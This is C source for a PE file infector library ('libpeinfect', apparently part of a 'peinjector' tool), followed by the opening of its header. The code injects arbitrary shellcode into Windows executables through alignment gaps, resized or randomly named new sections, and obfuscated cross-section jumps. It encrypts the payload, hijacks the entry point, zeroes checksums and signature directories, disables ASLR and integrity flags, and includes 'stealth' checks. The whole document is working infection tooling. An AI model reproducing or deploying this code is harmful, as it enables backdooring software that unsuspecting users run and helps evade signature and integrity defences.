      current = __peinfect_add_patch_memory(current, tmem, tmemsize,
          pe->section_header[helper->infected_section].PointerToRawData, true);
      free(tmem);
    }
  }

  return current;
}

/* Build patch chain for hidden jump method */
static inline PEINFECT_PATCH* __peinfect_build_patch_chain_cross_section_jmp(PEINFECT_PATCH *parent, PEINFECT *infect,
    PEFILE *pe, unsigned char *payload, size_t payloadsize, bool section_table_patched, PATCH_HELPER *helper) {
  PEINFECT_PATCH *current = parent;
  PATCH_HELPER *tmp = NULL;

  if (helper == NULL) {
    return NULL;
  }

  /* Build normal patch chain depending on method*/
  switch (helper->method) {
    case METHOD_ALIGNMENT:
      current = __peinfect_build_patch_chain_alignment(current, infect, pe, payload, payloadsize, false, helper);
      break;

    case METHOD_ALIGNMENT_RESIZE:
      current = __peinfect_build_patch_chain_alignment_resize(current, infect, pe, payload, payloadsize, false, helper);
      section_table_patched = true;
      break;

    case METHOD_NEW_SECTION:
      current = __peinfect_build_patch_chain_new_section(current, infect, pe, payload, payloadsize, false, helper);
      break;
  }

  /* Build jmp patch chain depending on method */
  if (helper->jmp != NULL) {
    helper = helper->jmp;
    while (helper != NULL) {
      switch (helper->method) {
        case METHOD_ALIGNMENT:
          current = __peinfect_build_patch_chain_alignment(current, infect, pe, helper->jmp_code, helper->jmpsize,
              section_table_patched, helper);
          break;

        case METHOD_ALIGNMENT_RESIZE:
          current = __peinfect_build_patch_chain_alignment_resize(current, infect, pe, helper->jmp_code,
              helper->jmpsize, section_table_patched, helper);
          break;

        case METHOD_NEW_SECTION:
          current = __peinfect_build_patch_chain_new_section(current, infect, pe, helper->jmp_code, helper->jmpsize,
              section_table_patched, helper);
          break;
      }

      /* Free code and jmp helper */
      tmp = helper->jmp;
      free(helper->jmp_code);
      free(helper);
      helper = tmp;
    }
  }

  /* Aggregate small jmps */
  __peinfect_build_patch_aggregate(parent);

  return current;
}

/* Checks if it's safe to infect file */
static inline bool __peinfect_check_stealth(PEINFECT *in_infect, PEFILE *in_pe) {
  uint32_t i = 0;
  if (!in_infect->try_stealth) {
    return true;
  }

  /* .ndata section (NSIS Installer) */
  for (i = 0; i < in_pe->pe_header.NumberOfSections; ++i) {
    if (strcmp((char *) &in_pe->section_header[i].Name, ".ndata") == 0) {
      return false;
    }
  }

  return true;
}

/* Clean Header fields (ASLR, Checksum, Signature DataDir, ...)  */
static inline void __peinfect_clean_header(PEINFECT *in, PEFILE *out) {
  /* 32 bit */
  if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
    out->optional_header_32.CheckSum = 0x00; /* Zero Checksum */
    out->optional_header_32.DataDirectory[DIR_SECURITY].Size = 0x00; /* Zero Signature */
    out->optional_header_32.DataDirectory[DIR_SECURITY].VirtualAddress = 0x00; /* Zero Signature */
    out->optional_header_32.DllCharacteristics &= ~IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE; /* Remove ASLR Flag*/
    out->optional_header_32.DllCharacteristics &= ~IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY; /* Remove Force Integrity Check */

    /* 64 bit */
  } else {
    out->optional_header_64.CheckSum = 0x00; /* Zero Checksum */
    out->optional_header_64.DataDirectory[DIR_SECURITY].Size = 0x00; /* Zero Signature */
    out->optional_header_64.DataDirectory[DIR_SECURITY].VirtualAddress = 0x00; /* Zero Signature */
    out->optional_header_64.DllCharacteristics &= ~IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE; /* Remove ASLR Flag */
    out->optional_header_64.DllCharacteristics &= ~IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY; /* Remove Force Integrity Check */

  }
}

/* Build payload from pre-configured and add return to OEP */
static inline unsigned char * __peinfect_build_payload(PEINFECT *in_infect, PEFILE *in_pe, size_t *payloadsize) {
  unsigned char *returncode = NULL;
  size_t returnsize = 0;
  unsigned char *payload = NULL;
  unsigned char *payload_encrypted = NULL;
  uint32_t i = 0;

  /* Build return code */
  returncode = peinfect_obfuscator_build_ep_jmp(in_pe, &returnsize);
  if (returncode == NULL) {
    return NULL;
  }

  /* 32 bit */
  if (in_pe->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
    /* payload present? */
    if (in_infect->shellcode_x86 == NULL) {
      return NULL;
    }
    *payloadsize = in_infect->shellcode_x86size + returnsize;

    /* Allocate memory for payload and return */
    payload = (unsigned char *) malloc(*payloadsize);
    if (payload == NULL) {
      free(returncode);
      return NULL;
    }

    /* Copy shellcode */
    memcpy(payload, in_infect->shellcode_x86, in_infect->shellcode_x86size);
    /* Copy return code */
    memcpy(payload + in_infect->shellcode_x86size, returncode, returnsize);

    /* 64 bit */
  } else {
    /* payload present? */
    if (in_infect->shellcode_x64 == NULL) {
      return NULL;
    }
    *payloadsize = in_infect->shellcode_x64size + returnsize;

    /* Allocate memory for payload and return */
    payload = (unsigned char *) malloc(*payloadsize);
    if (payload == NULL) {
      free(returncode);
      return NULL;
    }

    /* Copy shellcode */
    memcpy(payload, in_infect->shellcode_x64, in_infect->shellcode_x64size);
    /* Copy return code */
    memcpy(payload + in_infect->shellcode_x64size, returncode, returnsize);
  }

  /* Free return code */
  free(returncode);

  /* Encode payload */
  if (in_infect->encrypt) {
    /* Iterative encoding */
    for (i = 0; i < in_infect->encrypt_iterations; ++i) {
      /* Try to encode */
      payload_encrypted = peinfect_obfuscator_encrypt_payload(payload, *payloadsize, &returnsize,
          !(in_pe->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC));
      if (payload_encrypted != NULL) {
        free(payload);
        payload = payload_encrypted;
        *payloadsize = returnsize;
      }
    }
  }

  return payload;
}

/* Generates random section name */
static inline void __peinfect_random_sectionname(char *mem, size_t memsize) {
  size_t rnd;

  /* Nothing to do */
  if (mem == NULL || memsize == 0) {
    return;
  }

  mem[0] = '.';
  /* Fill with random AlphaNumerics*/
  while (--memsize != 0) {
    rnd = rand() % 3;
    if (rnd == 1) { /* 0 - 9*/
      mem[memsize] = 0x30 + rand() % 10;
    } else if (rnd == 2) { /* A - Z */
      mem[memsize] = 0x41 + rand() % 26;
    } else { /* a - z */
      mem[memsize] = 0x61 + rand() % 26;
    }
  }
}

/* Try infecting using alignment gap */
static inline int __peinfect_infect_alignment(PEINFECT *in, unsigned char *payload, size_t payloadsize,
    PATCH_HELPER *helper, int no_use_section, PEFILE *out) {
  size_t i;
  uint32_t ep;
  uint32_t old_virtsize;
  uint32_t old_rawsize;

  /* Method allowed? */
  if (!(in->methods & METHOD_ALIGNMENT)) {
    return false;
  }

  /* Clear helper structure */
  if (helper != NULL) {
    memset(helper, 0, sizeof(PATCH_HELPER));
  }

  /* Need Entry Point */
  if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
    if (out->optional_header_32.AddressOfEntryPoint == 0) {
      return false;
    }
  } else {
    if (out->optional_header_64.AddressOfEntryPoint == 0) {
      return false;
    }
  }

  for (i = 0; i < out->pe_header.NumberOfSections; ++i) {
    /* Don't use this section */
    if (no_use_section == (int) i) {
      continue;
    }

    /* Section is Executable */
    if ((in->methods & METHOD_CHANGE_FLAGS)
        || ((out->section_header[i].Characteristics & IMAGE_SCN_CNT_CODE)
            && (out->section_header[i].Characteristics & IMAGE_SCN_MEM_READ)
            && (out->section_header[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            && (out->section_header[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))) {

      /* Size Available */
      if ((out->section_header[i].SizeOfRawData > out->section_header[i].Misc.VirtualSize)
          && ((out->section_header[i].SizeOfRawData - out->section_header[i].Misc.VirtualSize) >= payloadsize)) {

        /* New Entry Point */
        ep = out->section_header[i].VirtualAddress + out->section_header[i].Misc.VirtualSize;
        old_virtsize = out->section_header[i].Misc.VirtualSize;
        old_rawsize = out->section_header[i].SizeOfRawData;

        /* Save helper data for patch */
        if (helper != NULL) {
          helper->infected_section = i;
          helper->old_virtualsize = old_virtsize;
          helper->old_rawsize = old_rawsize;
          helper->method = METHOD_ALIGNMENT;
        }

        /* Update Section */
        if (petool_resize_section(i, old_rawsize, old_virtsize + payloadsize, (helper != NULL), out)) {
          /* Copy payload in position */
          if (helper == NULL) {
            memcpy(out->section_data[i].mem + old_virtsize, payload, payloadsize);
          }

          /* Set new EntryPoint */
          if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
            out->optional_header_32.AddressOfEntryPoint = ep;
          } else {
            out->optional_header_64.AddressOfEntryPoint = ep;
          }

          /* Change flags if needed */
          if (in->methods & METHOD_CHANGE_FLAGS) {
            out->section_header[i].Characteristics |= EXECUTABLE_CHARACTERISTICS;
          }

          /* Infect OK */
          return i + 1;
        }
      }
    }
  }

  /* :( */
  return false;
}

/* Try infecting using alignment gap and resize  */
static inline int __peinfect_infect_alignment_resize(PEINFECT *in, unsigned char *payload, size_t payloadsize,
    PATCH_HELPER *helper, int no_use_section, PEFILE *out) {
  size_t i;
  uint32_t ep;
  uint32_t old_virtsize;
  uint32_t old_rawsize;
  uint32_t rawsize_delta;

  /* Method allowed? */
  if (!(in->methods & METHOD_ALIGNMENT_RESIZE)) {
    return false;
  }

  /* Clear helper structure */
  if (helper != NULL) {
    memset(helper, 0, sizeof(PATCH_HELPER));
  }

  /* Need Entry Point */
  if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
    if (out->optional_header_32.AddressOfEntryPoint == 0) {
      return false;
    }
  } else {
    if (out->optional_header_64.AddressOfEntryPoint == 0) {
      return false;
    }
  }

  for (i = 0; i < out->pe_header.NumberOfSections; ++i) {
    /* Don't use this section */
    if (no_use_section == (int) i) {
      continue;
    }

    /* Section is Executable */
    if ((in->methods & METHOD_CHANGE_FLAGS)
        || ((out->section_header[i].Characteristics & IMAGE_SCN_CNT_CODE)
            && (out->section_header[i].Characteristics & IMAGE_SCN_MEM_READ)
            && (out->section_header[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            && (out->section_header[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))) {

      /* Size Available */
      if ((out->section_header[i].SizeOfRawData > out->section_header[i].Misc.VirtualSize)
          && (((i + 1) >= out->pe_header.NumberOfSections)
              || ((out->section_header[i + 1].VirtualAddress
                  - (out->section_header[i].VirtualAddress + out->section_header[i].Misc.VirtualSize)) >= payloadsize))) {

        /* New Entry Point */
        ep = out->section_header[i].VirtualAddress + out->section_header[i].Misc.VirtualSize;
        old_virtsize = out->section_header[i].Misc.VirtualSize;
        old_rawsize = out->section_header[i].SizeOfRawData;

        /* New Space needed */
        rawsize_delta = payloadsize - (old_rawsize - old_virtsize);

        /* Save helper data for patch */
        if (helper != NULL) {
          helper->infected_section = i;
          helper->old_virtualsize = old_virtsize;
          helper->old_rawsize = old_rawsize;
          helper->method = METHOD_ALIGNMENT_RESIZE;
        }

        /* Update Section */
        if (petool_resize_section(i, old_rawsize + rawsize_delta, old_virtsize + payloadsize, (helper != NULL), out)) {

          /* Copy payload in position */
          if (helper == NULL) {
            memcpy(out->section_data[i].mem + old_virtsize, payload, payloadsize);
          }

          /* Set new EntryPoint */
          if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
            out->optional_header_32.AddressOfEntryPoint = ep;
          } else {
            out->optional_header_64.AddressOfEntryPoint = ep;
          }

          /* Change flags if needed */
          if (in->methods & METHOD_CHANGE_FLAGS) {
            out->section_header[i].Characteristics |= EXECUTABLE_CHARACTERISTICS;
          }

          /* Infect OK */
          return i + 1;
        }
      }
    }
  }

  /* :( */
  return false;
}

/* Try infecting inserting new section */
static inline int __peinfect_infect_new_section(PEINFECT *in, unsigned char *payload, size_t payloadsize,
    PATCH_HELPER *helper, int no_use_section, PEFILE *out) {
  int returnVar = false;
  char *section_name = NULL;
  size_t section_namesize = 0;
  char rnd_sectionname[NT_SHORT_NAME_LEN] = { 0 };

  /* Method allowed? */
  if (!(in->methods & METHOD_NEW_SECTION)) {
    return false;
  }

  /* Clear helper structure */
  if (helper != NULL) {
    memset(helper, 0, sizeof(PATCH_HELPER));
  }

  /* Need Entry Point */
  if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
    if (out->optional_header_32.AddressOfEntryPoint == 0) {
      return false;
    }
  } else {
    if (out->optional_header_64.AddressOfEntryPoint == 0) {
      return false;
    }
  }

  /* Save helper data for patch */
  if (helper != NULL) {
    helper->old_rawheadersize = out->dos_header.e_lfanew + sizeof(PE_HEADER) + out->pe_header.SizeOfOptionalHeader
        + out->pe_header.NumberOfSections * sizeof(SECTION_HEADER) + out->header_padding.memsize;
    helper->old_headerpaddingsize = out->header_padding.memsize;
  }

  /* Random section name? */
  if (in->rnd_sectionname) {
    section_namesize = (NT_SHORT_NAME_LEN / 2) + rand() % (NT_SHORT_NAME_LEN / 2 + 1);
    __peinfect_random_sectionname(rnd_sectionname, section_namesize);
    section_name = rnd_sectionname;
  } else {
    section_name = in->section_name;
    section_namesize = in->section_namesize;
  }

  /* Try add section */
  if (petool_add_section(section_name, section_namesize, EXECUTABLE_CHARACTERISTICS, payload, payloadsize,
      (helper != NULL), out)) {
    /* New Entry Point*/
    if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
      out->optional_header_32.AddressOfEntryPoint =
          out->section_header[out->pe_header.NumberOfSections - 1].VirtualAddress;
    } else {
      out->optional_header_64.AddressOfEntryPoint =
          out->section_header[out->pe_header.NumberOfSections - 1].VirtualAddress;
    }

    /* Save helper data for patch */
    if (helper != NULL) {
      helper->infected_section = out->pe_header.NumberOfSections - 1;
      helper->method = METHOD_NEW_SECTION;
    }

    returnVar = out->pe_header.NumberOfSections;
  }

  return returnVar;
}

/* Try infecting using hidden jmp method */
static inline bool __peinfect_infect_cross_section_jmp(PEINFECT *in, unsigned char *payload, size_t payloadsize,
    PATCH_HELPER *helper, int no_use_section, PEFILE *out) {
  size_t jmpsize = 0;
  uint32_t section = 0;
  uint32_t jmp_section = 0;
  PATCH_HELPER *jmp_helper = NULL;
  size_t i = 0;
  unsigned char *jmp_payload = NULL;

  /* Method allowed? */
  if (!(in->methods & METHOD_CROSS_SECTION_JUMP)) {
    return false;
  }

  /* Clear helper structure */
  if (helper != NULL) {
    memset(helper, 0, sizeof(PATCH_HELPER));
  }

  /* Need Entry Point */
  if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
    if (out->optional_header_32.AddressOfEntryPoint == 0) {
      return false;
    }
  } else {
    if (out->optional_header_64.AddressOfEntryPoint == 0) {
      return false;
    }
  }

  /* Infect normal */
  if (!((section = __peinfect_infect_alignment(in, payload, payloadsize, helper, no_use_section, out)) || (section =
      __peinfect_infect_alignment_resize(in, payload, payloadsize, helper, no_use_section, out)) || (section =
      __peinfect_infect_new_section(in, payload, payloadsize, helper, no_use_section, out)))) {
    return false;
  }

  /* Insert jumps */
  for (i = 0; i < in->jump_iterations; ++i) {

    /* Build jmp */
    jmp_payload = peinfect_obfuscator_build_ep_jmp(out, &jmpsize);

    /* Exit, no JMP shellcode */
    if (jmp_payload == NULL) {
      return true;
    }

    /* Build jmp helper struct if needed */
    if (helper != NULL) {
      jmp_helper = malloc(sizeof(PATCH_HELPER));
      if (jmp_helper == NULL) {
        free(jmp_payload);
        return true;
      }
      memset(jmp_helper, 0, sizeof(PATCH_HELPER));
    }

    /* Inject jmp in another section*/
    if (!((jmp_section = __peinfect_infect_alignment(in, jmp_payload, jmpsize, jmp_helper, section - 1, out))
        || (jmp_section = __peinfect_infect_new_section(in, jmp_payload, jmpsize, jmp_helper, section - 1, out)))) {
      free(jmp_payload);
      if (jmp_helper != NULL) {
        free(jmp_helper);
      }
      return true;
    }
    section = jmp_section;

    /* Safe jmp payload */
    if (helper != NULL) {
      helper->jmp = jmp_helper;
      jmp_helper->jmp_code = jmp_payload;
      jmp_helper->jmpsize = jmpsize;
      helper = jmp_helper;
    } else {
      /* Free tmp payload */
      free(jmp_payload);
    }
  }

  return true;
}

void peinfect_init(PEINFECT *out) {
  memset(out, 0, sizeof(PEINFECT));

  /* For the glory of beelzebub and random section names */
  srand(time(NULL));

  /* Allow all methods, except METHOD_CROSS_SECTION_JUMP */
  out->methods = METHOD_ALL & ~METHOD_CROSS_SECTION_JUMP;

  /* Remove integrity checks */
  out->remove_integrity = true;

  /* Random section names  */
  out->rnd_sectionname = true;

  /* Cross section jump interations */
  out->jump_iterations = 1;

  /* Encrypt shellcode */
  out->encrypt = true;

  /* Encryption iterations */
  out->encrypt_iterations = 1;

  /* Try to be stealthy */
  out->try_stealth = true;
}

void peinfect_set_sectionname(char *section_name, size_t section_namesize, bool random, PEINFECT *out) {

  char *old_section_name = NULL;

  /* Remove old section name */
  if (out->section_name != NULL) {
    /* Don't free here so that the swap is an atomic operation
     and it's possible to change section name while it's used
     in another thread for infection without the possibility of
     a use-after-free. Not the cleanest solution, but better
     than heavy synchronization overhead */
    old_section_name = out->section_name;
    out->section_name = NULL;
  }

  /* Set New section name */
  if ((!random) && section_name != NULL) {
    /* Limit size according to PE COFF */
    out->section_namesize = MIN(NT_SHORT_NAME_LEN, section_namesize);
    /* Copy new section name */
    out->section_name = malloc(out->section_namesize + 1);
    if (out->section_name != NULL) {
      memcpy(out->section_name, section_name, out->section_namesize);
      out->section_name[out->section_namesize] = 0x00;
    }
  }

  /* Random Section Name?*/
  out->rnd_sectionname = random;

  /* Free old section Name*/
  if (old_section_name != NULL) {
    free(old_section_name);
  }
}

char* peinfect_get_sectionname(PEINFECT *in) {
  return in->section_name;
}

void peinfect_set_methods(PEINFECT_METHOD methods, PEINFECT *out) {
  /* Set Methods */
  out->methods = methods;
}

PEINFECT_METHOD peinfect_get_methods(PEINFECT *in) {
  return in->methods;
}

void peinfect_set_jumpiterations(uint32_t iterations, PEINFECT *out) {
  /* Set Iterations */
  out->jump_iterations = MIN(MAX(iterations, 1), 64);
}

uint32_t peinfect_get_jumpiterations(PEINFECT *in) {
  return in->jump_iterations;
}

void peinfect_set_encryptiterations(uint32_t iterations, PEINFECT *out) {
  /* Set Iterations */
  out->encrypt_iterations = MIN(MAX(iterations, 1), 16);
}

uint32_t peinfect_get_encryptiterations(PEINFECT *in) {
  return in->encrypt_iterations;
}

void peinfect_set_removeintegrity(bool remove_integrity, PEINFECT *out) {
  out->remove_integrity = remove_integrity;
}

bool peinfect_get_removeintegrity(PEINFECT *in) {
  return in->remove_integrity;
}

void peinfect_set_encrypt(bool encrypt, PEINFECT *out) {
  out->encrypt = encrypt;
}

bool peinfect_get_encrypt(PEINFECT *in) {
  return in->encrypt;
}

void peinfect_set_trystaystealth(bool try_stealth, PEINFECT *out) {
  out->try_stealth = try_stealth;
}

bool peinfect_get_trystaystealth(PEINFECT *in) {
  return in->try_stealth;
}

bool peinfect_set_shellcode(unsigned char *mem, size_t memsize, bool x64, PEINFECT *out) {
  unsigned char *newmem = NULL;
  unsigned char *oldmem = NULL;

  /* Allocate memory and copy new shellcode */
  if (memsize) {
    newmem = malloc(memsize);
    if (newmem == NULL) {
      return false;
    }
    memcpy(newmem, mem, memsize);
  }

  /* Set x64 Shellcode */
  if (x64) {
    /* Store old memory pointer */
    if (out->shellcode_x64 != NULL) {
      oldmem = out->shellcode_x64;
    }
    /* Set shellcode size and mem */
    out->shellcode_x64 = newmem;
    out->shellcode_x64size = memsize;

    /* Reset counter */
    out->infect_cnt_x64 = 0;

    /* Set x86 Shellcode */
  } else {
    /* Store old memory pointer */
    if (out->shellcode_x86 != NULL) {
      oldmem = out->shellcode_x86;
    }
    /* Set shellcode size and mem */
    out->shellcode_x86 = newmem;
    out->shellcode_x86size = memsize;

    /* Reset counter */
    out->infect_cnt_x86 = 0;
  }

  /* Free old memory */
  if (oldmem != NULL) {
    free(oldmem);
  }

  return true;
}

unsigned char* peinfect_get_shellcode(PEINFECT *in, bool x64) {
  return x64 ? in->shellcode_x64 : in->shellcode_x86;
}

void peinfect_set_infectcounter(uint32_t counter, bool x64, PEINFECT *out) {
  if (x64) {
    out->infect_cnt_x64 = counter;
  } else {
    out->infect_cnt_x86 = counter;
  }
}

uint32_t peinfect_get_infectcounter(PEINFECT *in, bool x64) {
  return x64 ? in->infect_cnt_x64 : in->infect_cnt_x86;
}

bool peinfect_infect_full(unsigned char *mem, size_t memsize, PEINFECT *in, PEFILE *out) {
  unsigned char *payload;
  size_t payloadsize;
  bool returnVar = false;

  /* Try parse PE File */
  if (!pefile_read_mem(mem, memsize, NULL, out)) {
    return false;
  }

  /* Optional Header present? */
  if (!((out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC)
      || (out->optional_header_64.Magic == NT_OPTIONAL_64_MAGIC))) {
    return false;
  }

  /* Clean Header fields (ASLR, Checksum, Signature DataDir, ...) */
  if (in->remove_integrity) {
    __peinfect_clean_header(in, out);
  }

  /* Stealth checks */
  if (!__peinfect_check_stealth(in, out)) {
    return false;
  }

  /* Build payload */
  if ((payload = __peinfect_build_payload(in, out, &payloadsize)) == NULL) {
    return false;
  }

  /* Try hidden jump inject */
  if (__peinfect_infect_cross_section_jmp(in, payload, payloadsize, NULL, -1, out)) {
    returnVar = true;

    /* Try alignment inject */
  } else if (__peinfect_infect_alignment(in, payload, payloadsize, NULL, -1, out)) {
    returnVar = true;

    /* Try alignment inject with resize */
  } else if (__peinfect_infect_alignment_resize(in, payload, payloadsize, NULL, -1, out)) {
    returnVar = true;

    /* Try new section */
  } else if (__peinfect_infect_new_section(in, payload, payloadsize, NULL, -1, out)) {
    returnVar = true;

  }

  /* Free payload */
  free(payload);

  /* Some stats */
  if (returnVar) {
    if (out->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
      in->infect_cnt_x86++;
    } else {
      in->infect_cnt_x64++;
    }
  }

  /* Free PE File if not successful */
  if (!returnVar) {
    pefile_free(out);
  }

  return returnVar;
}

bool peinfect_infect_full_file(char *infile, PEINFECT *in, char *outfile) {
  bool returnVar = false;
  unsigned char *file_mem;
  PEFILE pefile;

  /* Open file */
  FILE *fh = fopen(infile, "rb");

  if (fh != NULL) {

    /* Get file size and allocate buffer */
    if (!fseek(fh, 0L, SEEK_END)) {
      size_t size = ftell(fh);
      size_t read_size = 0;
      rewind(fh);
      file_mem = malloc(size);

      if (file_mem != NULL) {
        /* Load file into buffer */
        read_size = fread(file_mem, size, 1, fh);
        fclose(fh);
        fh = NULL;

        /* Process file in memory */
        if (read_size == 1) {
          returnVar = peinfect_infect_full(file_mem, size, in, &pefile);
        }

        /* free buffer after use */
        free(file_mem);

        /* Write file to disk*/
        if (returnVar) {
          returnVar = pefile_write_file(&pefile, NULL, outfile);

          /* Free PE File */
          pefile_free(&pefile);
        }
      }
    }

    /* Close file (if memory allocation has failed) */
    if (fh != NULL) {
      fclose(fh);
    }
  }

  return returnVar;
}

bool peinfect_infect_patch(unsigned char *mem, size_t memsize, PEINFECT *in, PEINFECT_PATCH *out) {
  PATCH_HELPER helper;
  PEFILE pe_out;
  unsigned char *payload;
  size_t payloadsize;
  bool returnVar = false;
  PEINFECT_PATCH *current = out;
  PEFILE_READ_OPTIONS read_options;

  /* Header only */
  read_options.header_only = true;

  /* Init PEFILE */
  pefile_init(&pe_out);

  /* Clear patch structure */
  memset(out, 0, sizeof(PEINFECT_PATCH));

  /* Clear helper structure */
  memset(&helper, 0, sizeof(PATCH_HELPER));

  /* Try parse PE File */
  if (!pefile_read_mem(mem, memsize, &read_options, &pe_out)) {
    return false;
  }

  /* Optional Header present? */
  if (!((pe_out.optional_header_32.Magic == NT_OPTIONAL_32_MAGIC)
      || (pe_out.optional_header_64.Magic == NT_OPTIONAL_64_MAGIC))) {
    return false;
  }

  /* Clean Header fields (ASLR, Checksum, Signature DataDir, ...) */
  if (in->remove_integrity) {
    __peinfect_clean_header(in, &pe_out);
  }

  /* Stealth checks */
  if (!__peinfect_check_stealth(in, &pe_out)) {
    return false;
  }

  /* Build payload */
  if ((payload = __peinfect_build_payload(in, &pe_out, &payloadsize)) == NULL) {
    return false;
  }

  /* Try alignment inject */
  if (__peinfect_infect_cross_section_jmp(in, payload, payloadsize, &helper, -1, &pe_out)) {
    /* Build patch chain */
    current = __peinfect_build_patch_chain_cross_section_jmp(current, in, &pe_out, payload, payloadsize, false,
        &helper);
    /* patch built! */
    returnVar = (current != NULL);

    /* Try alignment inject */
  } else if (__peinfect_infect_alignment(in, payload, payloadsize, &helper, -1, &pe_out)) {
    /* Build patch chain */
    current = __peinfect_build_patch_chain_alignment(current, in, &pe_out, payload, payloadsize, false, &helper);
    /* patch built! */
    returnVar = (current != NULL);

    /* Try alignment inject with resize */
  } else if (__peinfect_infect_alignment_resize(in, payload, payloadsize, &helper, -1, &pe_out)) {
    /* Build patch chain */
    current = __peinfect_build_patch_chain_alignment_resize(current, in, &pe_out, payload, payloadsize, false, &helper);
    /* patch built! */
    returnVar = (current != NULL);

    /* Try new section with tls-entry and than new section (Same patch chain) */
  } else if (__peinfect_infect_new_section(in, payload, payloadsize, &helper, -1, &pe_out)) {
    /* Build patch chain */
    current = __peinfect_build_patch_chain_new_section(current, in, &pe_out, payload, payloadsize, false, &helper);
    /* patch built! */
    returnVar = (current != NULL);

  }

  /* Free payload */
  free(payload);

  /* Some stats */
  if (returnVar) {
    if (pe_out.optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
      in->infect_cnt_x86++;
    } else {
      in->infect_cnt_x64++;
    }
  }

  /* Free PE File*/
  pefile_free(&pe_out);

  /* Free patch if not successful */
  if (!returnVar) {
    peinfect_free_patch(out);
  }

  return returnVar;
}

bool peinfect_infect_patch_file(char *infile, PEINFECT *in) {
  bool returnVar = false;
  unsigned char *file_mem;
  PEINFECT_PATCH patch;
  unsigned char *mem = NULL;
  unsigned char **mem_ref = (unsigned char **) &mem;
  size_t memsize = 0;

  /* Open file */
  FILE *fh = fopen(infile, "rb");

  if (fh != NULL) {

    /* Get file size and allocate buffer */
    if (!fseek(fh, 0L, SEEK_END)) {
      size_t size = MAX(ftell(fh), 4096);
      size_t read_size = 0;
      rewind(fh);
      file_mem = malloc(size);

      if (file_mem != NULL) {
        /* Load file into buffer */
        read_size = fread(file_mem, size, 1, fh);
        fclose(fh);
        fh = NULL;

        /* Process file in memory */
        if (read_size == 1) {
          returnVar = peinfect_infect_patch(file_mem, size, in, &patch);
        }

        /* free buffer after use */
        free(file_mem);

        /* Free */
        if (returnVar) {

          /* Debug Patch*/
          __peinfect_patch_show_dbg(&patch);

          if (peinfect_patch_serialize(&patch, mem_ref, &memsize)) {
            printf("Serialized size: %d bytes\n\n", (uint32_t) memsize);
            if (mem) {
              free(mem);
            }
          }

          /* Free patch */
          peinfect_free_patch(&patch);
        }
      }
    }

    /* Close file (if memory allocation has failed) */
    if (fh != NULL) {
      fclose(fh);
    }
  }

  return returnVar;
}

bool peinfect_patch_serialize(PEINFECT_PATCH *in, unsigned char **mem, size_t *memsize) {
  PEINFECT_PATCH *current = in;
  unsigned char *serialmem;

  /* Get MemSize */
  *memsize = 0;
  while (current != NULL) {
    *memsize += 2 * sizeof(uint32_t) + sizeof(uint8_t) + current->memsize;
    current = current->next;
  }

  /* Allocate memory */
  *mem = (unsigned char *) calloc(1, *memsize);
  if (*mem == NULL) {
    return false;
  }

  current = in;
  serialmem = *mem;
  /* Serialize */
  while (current != NULL) {
    memcpy(serialmem + 0 * sizeof(uint32_t), &current->memsize, sizeof(uint32_t));
    memcpy(serialmem + 1 * sizeof(uint32_t), &current->position, sizeof(uint32_t));
    memcpy(serialmem + 2 * sizeof(uint32_t), &current->insert, sizeof(uint8_t));
    if (current->memsize && current->mem) {
      memcpy(serialmem + 2 * sizeof(uint32_t) + sizeof(uint8_t), current->mem, current->memsize);
    }
    serialmem += 2 * sizeof(uint32_t) + sizeof(uint8_t) + current->memsize;
    current = current->next;
  }

  return true;
}

void peinfect_free(PEINFECT *in) {
  /* Free x86 Shellcode */
  if (in->shellcode_x86 != NULL) {
    free(in->shellcode_x86);
  }

  /* Free x64 Shellcode */
  if (in->shellcode_x64 != NULL) {
    free(in->shellcode_x64);
  }

  /* Free SectionName */
  if (in->section_name != NULL) {
    free(in->section_name);
  }

  /* Zero struct */
  memset(in, 0, sizeof(PEINFECT));
}

void peinfect_free_patch(PEINFECT_PATCH *in) {
  PEINFECT_PATCH *current = in;

  while (current != NULL) {
    /* Free memory */
    if (current->mem != NULL) {
      free(current->mem);
    }

    /* Free element if not first element*/
    if (current != in) {
      free(current);
    }

    /* Next element */
    current = current->next;
  }
}


```

`peinjector/libpeinfect.h`:

```h
/**
 * \file   libpeinfect.h
 * \author A.A.
 * \brief  Infects a PE File with a given payload
 */

#ifndef LIBPEINFECT_H_
#define LIBPEINFECT_H_

#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stddef.h>
#include "libpetool.h"

/**
 * Sentinel size of serialized patch
 */
#define PEINFECT_PATCH_SENTINELSIZE 9

/**
 * Available Injection Methods
 */
typedef enum _PEINFECT_METHOD {
  METHOD_ALIGNMENT = 1 << 0,          //!< Alignment-gap only method
  METHOD_ALIGNMENT_RESIZE = 1 << 1,   //!< Alignment-gap and resize method
  METHOD_NEW_SECTION = 1 << 2,        //!< Insert new section method
  METHOD_CHANGE_FLAGS = 1 << 3,       //!< Change section flags (combined with alignment/alignment-resize)
  METHOD_CROSS_SECTION_JUMP = 1 << 4, //!< Inserts obfuscated jump at entry point and hides payload in another section
  METHOD_ALL = METHOD_ALIGNMENT | METHOD_ALIGNMENT_RESIZE | METHOD_NEW_SECTION | METHOD_CHANGE_FLAGS | METHOD_CROSS_SECTION_JUMP
} PEINFECT_METHOD;

/**
 * PE Infect control structure
 */
typedef struct _PEINFECT {
  unsigned char *shellcode_x86; //!< Holds x86 shellcode
  size_t shellcode_x86size;     //!< Size of x86 shellcode
  unsigned char *shellcode_x64; //!< Holds x64 shellcode
